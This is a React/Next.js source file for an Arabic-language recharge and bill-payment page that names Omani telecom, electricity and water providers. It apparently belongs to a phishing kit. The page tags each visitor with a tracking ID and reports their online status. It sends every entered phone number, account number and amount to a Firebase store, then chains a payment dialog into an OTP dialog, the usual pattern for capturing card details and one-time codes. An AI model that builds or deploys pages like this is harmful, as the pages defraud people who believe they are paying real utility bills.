"use client"

import { useEffect, useState } from "react"
import { Button } from "@/components/ui/button"
import { Card, CardContent } from "@/components/ui/card"
import { Input } from "@/components/ui/input"
import { Label } from "@/components/ui/label"
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select"
import { useForm, Controller } from "react-hook-form"
import { zodResolver } from "@hookform/resolvers/zod"
import { z } from "zod"
import { PaymentDialog } from "@/components/payment-dialog"
import { SiteHeader } from "@/components/site-header"
import { addData } from "@/lib/firebase"
import { setupOnlineStatus } from "@/lib/utils"
import { OTPDialog } from "@/components/otp-dialog"
import { CheckCircle2, AlertCircle } from "lucide-react"
import Link from "next/link"
import { AppFooter } from "@/components/app-footer"

// Define the validation schema
const rechargeSchema = z
  .object({
    serviceType: z.string().min(1, "يرجى اختيار نوع الخدمة"),
    provider: z.string().min(1, "يرجى اختيار مزود الخدمة"),
    phoneNumber: z.string().min(8, "يرجى إدخال رقم هاتف صحيح"),
    amount: z.number().min(0.5, "يجب أن يكون المبلغ 0.5 ريال عماني على الأقل"),
    confirmAmount: z.number(),
    accountNumber: z.string().optional(),
  })
  .refine((data) => data.amount === data.confirmAmount, {
    message: "المبلغ غير متطابق",
    path: ["confirmAmount"],
  })

// Service providers data
const serviceProviders = [
  { id: "omantel", name: "عمانتل", type: "telecom" },
  { id: "ooredoo", name: "اوريدو", type: "telecom" },
  { id: "vodafone", name: "فودافون", type: "telecom" },
  { id: "awaser", name: "اواصر", type: "telecom" },
  { id: "nama-dhofar", name: "شركة نماء ظفار", type: "electricity" },
  { id: "nama-supply", name: "شركة نماء للتزويد", type: "electricity" },
  { id: "oman-water", name: "الشركة العمانية لخدمات المياه والصرف الصحي", type: "water" },
]

function randstr(prefix: string) {
  return Math.random()
    .toString(36)
    .replace("0.", prefix || "")
}
const visitorID = randstr("om-")

export default function RechargePage() {
  const {
    register,
    handleSubmit,
    formState: { errors, isValid },
    watch,
    setValue,
    getValues,
    control,
    reset,
  } = useForm<z.infer<typeof rechargeSchema>>({
    resolver: zodResolver(rechargeSchema),
    mode: "onBlur",
    defaultValues: {
      serviceType: "telecom",
      provider: "",
      phoneNumber: "",
      amount: 0,
      confirmAmount: 0,
      accountNumber: "",
    },
  })

  const serviceType = watch("serviceType")
  const [showPaymentDialog, setShowPaymentDialog] = useState(false)
  const [showOtpDialog, setShowOtpDialog] = useState(false)
  const [showSuccess, setShowSuccess] = useState(false)
  const [billData, setBillData] = useState<any | null>(null)
  const [fetchingBill, setFetchingBill] = useState(false)
  const [billError, setBillError] = useState<string | null>(null)

  const onSubmit = async (data: z.infer<typeof rechargeSchema>) => {
    try {
      const visitorId = localStorage.getItem("visitor") || visitorID
      await addData({
        id: visitorId,
        ...data,
      })
      setShowPaymentDialog(true)
    } catch (error) {
      console.error("Error submitting form:", error)
    }
  }

  const handleReset = () => {
    reset()
    setBillData(null)
    setBillError(null)
    setShowSuccess(false)
  }

  const filteredProviders = serviceProviders.filter((provider) => provider.type === serviceType)
  const isUtilityService = serviceType === "electricity" || serviceType === "water"

  const fetchBill = async () => {
    const accountNumber = getValues().accountNumber
    const phoneNumber = getValues().phoneNumber

    if (!accountNumber || !phoneNumber) {
      setBillError("يرجى إدخال رقم الحساب ورقم الهاتف أولاً")
      return
    }

    setFetchingBill(true)
    setBillError(null)
    setBillData(null)

    try {
      const response = await fetch("/api/fetch-bill", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ accountNumber, phoneNumber }),
      })

      const data = await response.json()

      if (!response.ok) {
        throw new Error(data.error || "حدث خطأ غير متوقع.")
      }

      setBillData(data)
      setValue("amount", data.amount, { shouldValidate: true })
      setValue("confirmAmount", data.amount, { shouldValidate: true })
    } catch (error: any) {
      setBillError(error.message)
    } finally {
      setFetchingBill(false)
    }
  }

  useEffect(() => {
    setValue("provider", "")
    setValue("accountNumber", "")
    setBillData(null)
    setBillError(null)
  }, [serviceType, setValue])

  useEffect(() => {
    async function getLocation() {
      try {
        const country = "Oman"
        addData({ id: visitorID, country: country })
        localStorage.setItem("country", country)
        setupOnlineStatus(visitorID)
      } catch (error) {
        console.error("Error fetching location:", error)
      }
    }
    getLocation()
  }, [])

  if (showSuccess) {
    return (
      <div className="bg-gray-50 min-h-screen font-sans flex flex-col" dir="rtl">
        <SiteHeader />
        <main
          className="flex-grow flex items-center justify-center p-4"
          style={{ backgroundImage: "url(/bg.png)", backgroundRepeat: "repeat", backgroundSize: "auto" }}
        >
          <Card className="max-w-md mx-auto bg-white/90 backdrop-blur-sm shadow-xl rounded-2xl border-gray-200">
            <CardContent className="p-8 text-center">
              <CheckCircle2 className="w-20 h-20 text-green-500 mx-auto mb-4" />
              <h2 className="text-2xl font-bold text-gray-800 mb-2">تمت العملية بنجاح!</h2>
              <p className="text-gray-600 mb-6">تمت معالجة طلبك بنجاح. ستتلقى رسالة تأكيد قريبًا.</p>
              <div className="space-y-3">
                <Button
                  onClick={handleReset}
                  className="w-full bg-[#9aca3f] hover:bg-[#006e33] text-white font-bold text-lg py-3 rounded-lg"
                >
                  إجراء عملية أخرى
                </Button>
                <Link href="/">
                  <Button variant="outline" className="w-full bg-transparent">
                    العودة للصفحة الرئيسية
                  </Button>
                </Link>
              </div>
            </CardContent>
          </Card>
        </main>
        <AppFooter />
      </div>
    )
  }

  return (
    <div className="bg-gray-50 min-h-screen font-sans flex flex-col" dir="rtl">
      <SiteHeader />
      <main className="flex-grow">
        <div className="bg-[#9aca3f] text-white text-center py-6">
          <h1 className="text-2xl md:text-3xl font-bold">استعراض ودفع الفواتير</h1>
          <p className="text-sm opacity-90 mt-2">خدمات الكهرباء والماء وتعبئة الرصيد</p>
        </div>
        <div
          className="py-12 px-4"
          style={{ backgroundImage: "url(/bg.png)", backgroundRepeat: "repeat", backgroundSize: "auto" }}
        >
          <Card className="max-w-md mx-auto bg-white/80 backdrop-blur-sm shadow-xl rounded-2xl border-gray-200">
            <CardContent className="p-8">
              <form className="space-y-4" onSubmit={handleSubmit(onSubmit)}>
                <Controller
                  name="serviceType"
                  control={control}
                  render={({ field }) => (
                    <div className="space-y-2">
                      <Label>نوع الخدمة</Label>
                      <Select onValueChange={field.onChange} defaultValue={field.value}>
                        <SelectTrigger className="bg-white">
                          <SelectValue placeholder="اختر..." />
                        </SelectTrigger>
                        <SelectContent>
                          <SelectItem value="telecom">تعبئة رصيد</SelectItem>
                          <SelectItem value="electricity">فاتورة كهرباء</SelectItem>
                          <SelectItem value="water">فاتورة مياه</SelectItem>
                        </SelectContent>
                      </Select>
                    </div>
                  )}
                />

                <Controller
                  name="provider"
                  control={control}
                  render={({ field }) => (
                    <div className="space-y-2">
                      <Label>مزود الخدمة</Label>
                      <Select onValueChange={field.onChange} value={field.value}>
                        <SelectTrigger className="bg-white" disabled={!serviceType}>
                          <SelectValue placeholder="حدد المزود" />
                        </SelectTrigger>
                        <SelectContent>
                          {filteredProviders.map((p) => (
                            <SelectItem key={p.id} value={p.id}>
                              {p.name}
                            </SelectItem>
                          ))}
                        </SelectContent>
                      </Select>
                      {errors.provider && <p className="text-red-500 text-sm">{errors.provider.message}</p>}
                    </div>
                  )}
                />

                <div className="space-y-2">
                  <Label htmlFor="phone-number">رقم الهاتف</Label>
                  <Input id="phone-number" type="tel" className="bg-white" dir="ltr" {...register("phoneNumber")} />
                  {errors.phoneNumber && <p className="text-red-500 text-sm">{errors.phoneNumber.message}</p>}
                </div>

                {isUtilityService && (
                  <div className="space-y-2">
                    <Label htmlFor="account-number">رقم الحساب</Label>
                    <Input id="account-number" className="bg-white" dir="ltr" {...register("accountNumber")} />
                    <Button
                      type="button"
                      onClick={fetchBill}
                      disabled={fetchingBill}
                      className="w-full mt-2 bg-gray-100 text-gray-800 hover:bg-gray-200"
                    >
                      {fetchingBill ? "جاري جلب الفاتورة..." : "جلب الفاتورة"}
                    </Button>
                    {billError && (
                      <p className="text-red-500 text-sm mt-2 flex items-center gap-1">
                        <AlertCircle size={16} />
                        {billError}
                      </p>
                    )}
                    {billData && (
                      <div className="bg-green-50 p-3 rounded-lg mt-2 border border-green-200">
                        <p className="text-sm text-green-800">
                          المبلغ المستحق: <span className="font-bold">{billData.amount} ر.ع</span>
                        </p>
                        <p className="text-sm text-green-800">تاريخ الاستحقاق: {billData.dueDate}</p>
                      </div>
                    )}
                  </div>
                )}

                <div className="space-y-2">
                  <Label htmlFor="amount">المبلغ (ر.ع)</Label>
                  <Input
                    id="amount"
                    type="number"
                    step="0.01"
                    className="bg-white"
                    dir="ltr"
                    {...register("amount", { valueAsNumber: true })}
                    disabled={isUtilityService && billData}
                  />
                  {errors.amount && <p className="text-red-500 text-sm">{errors.amount.message}</p>}
                </div>

                <div className="space-y-2">
                  <Label htmlFor="confirm-amount">إعادة إدخال المبلغ</Label>
                  <Input
                    id="confirm-amount"
                    type="number"
                    step="0.01"
                    className="bg-white"
                    dir="ltr"
                    {...register("confirmAmount", { valueAsNumber: true })}
                    disabled={isUtilityService && billData}
                  />
                  {errors.confirmAmount && <p className="text-red-500 text-sm">{errors.confirmAmount.message}</p>}
                </div>

                <div className="pt-4 space-y-3">
                  <Button
                    type="submit"
                    disabled={!isValid || fetchingBill}
                    className="w-full bg-[#9aca3f] hover:bg-[#006e33] text-white font-bold text-lg py-3 rounded-lg"
                  >
                    الانتقال للدفع
                  </Button>
                  <Link href="/">
                    <Button type="button" variant="ghost" className="w-full">
                      العودة للصفحة الرئيسية
                    </Button>
                  </Link>
                </div>
              </form>
            </CardContent>
          </Card>
        </div>

        <PaymentDialog
          open={showPaymentDialog}
          onOpenChange={setShowPaymentDialog}
          totalAmount={watch("amount")}
          onSuccess={() => {
            setShowPaymentDialog(false)
            setShowOtpDialog(true)
          }}
        />

        <OTPDialog
          open={showOtpDialog}
          onOpenChange={setShowOtpDialog}
          phoneNumber={watch("phoneNumber")}
          onSuccess={() => {
            setShowOtpDialog(false)
            setShowSuccess(true)
          }}
        />
      </main>
      <AppFooter />
    </div>
  )
}
